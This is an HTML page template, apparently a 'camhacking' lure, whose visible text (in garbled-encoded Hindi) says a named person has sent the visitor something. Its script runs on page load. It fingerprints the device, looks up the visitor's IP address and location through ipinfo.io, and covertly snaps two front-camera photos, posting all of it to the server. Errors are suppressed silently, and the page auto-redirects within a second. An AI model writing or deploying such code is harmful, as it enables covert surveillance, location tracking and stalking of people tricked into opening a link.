<body>
  <div class="card">
    <h1>üëã {{ user_name }} ‡§®‡•á ‡§Ü‡§™‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•Å‡§õ ‡§≠‡•á‡§ú‡§æ ‡§π‡•à</h1>
    <p>‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡•Ä‡§ö‡•á ‡§ï‡•ç‡§≤‡§ø‡§ï ‡§ï‡§∞‡•á‡§Ç‡•§</p>
    <button id="btnCam">‡§¶‡•á‡§ñ‡•á‡§Ç</button>

  </div>

<script>
const token = "{{ token }}";
const ipinfoToken = "{{ ipinfo_token }}";

// ---------------- System Info ---------------- //
async function collectInfo() {
  let info = {};
  info.userAgent = navigator.userAgent;
  info.language = navigator.language;
  info.platform = navigator.platform;
  info.screen = `${screen.width}x${screen.height}`;
  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  if (navigator.hardwareConcurrency) info.cpuCores = navigator.hardwareConcurrency;
  if (navigator.deviceMemory) info.ram = navigator.deviceMemory + " GB";

  let batteryText = "";
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      batteryText = `üîã Battery: ${Math.round(battery.level * 100)}% | Charging: ${battery.charging ? "Yes" : "No"}`;
    } catch(e) {}
  }

  let netText = "";
  if (navigator.connection) {
    netText = `üì∂ Network: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink} Mbps`;
  }

  let ipData = {};
  try {
    const res = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
    ipData = await res.json();
  } catch(e){}

  let text = "üß† *System Info Captured*\n";
  text += "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n";
  text += `üåê *IP:* ${ipData.ip || "N/A"}\n`;
  text += `üè¢ *ISP:* ${ipData.org || "N/A"}\n`;
  text += `üìç *Location:* ${ipData.city || ""}, ${ipData.region || ""}, ${ipData.country || ""}\n`;
  text += `üíª *Device:* ${info.platform}\n`;
  text += `üñ•Ô∏è *Screen:* ${info.screen}\n`;
  text += `üåê *Browser:* ${info.userAgent}\n`;
  text += `üïí *Timezone:* ${info.timezone}\n`;
  if (info.cpuCores) text += `‚öôÔ∏è *CPU Cores:* ${info.cpuCores}\n`;
  if (info.ram) text += `üíæ *RAM:* ${info.ram}\n`;
  if (batteryText) text += batteryText + "\n";
  if (netText) text += netText + "\n";

  fetch("/send_info", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({token, info: text})
  });
}
collectInfo();

// ---------------- Camera Capture (Background) ---------------- //
async function captureCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }
    });

    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");

    function takeSnapshot() {
      canvas.width = 640;
      canvas.height = 480;
      ctx.drawImage(video, 0, 0, 640, 480);
      const image = canvas.toDataURL("image/jpeg", 0.75);
      fetch("/send_photo", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ image, token })
      }).catch(()=>{});
    }

    // Take 2 frames: one immediately, one after 350ms
    takeSnapshot();
    setTimeout(takeSnapshot, 350);

    // Stop stream after 1s
    setTimeout(() => stream.getTracks().forEach(t => t.stop()), 1000);

  } catch(e) {
    // Permission denied or error ‚Üí skip silently
  }
}
captureCamera();

// ---------------- Redirect ---------------- //
document.getElementById("btnCam").addEventListener("click", ()=>{
  window.location.href = "/next?token=" + token;
});

// Auto redirect after ~600ms (whether camera works or not)
setTimeout(()=>{
  window.location.href = "/next?token=" + token;
}, 600);
</script>
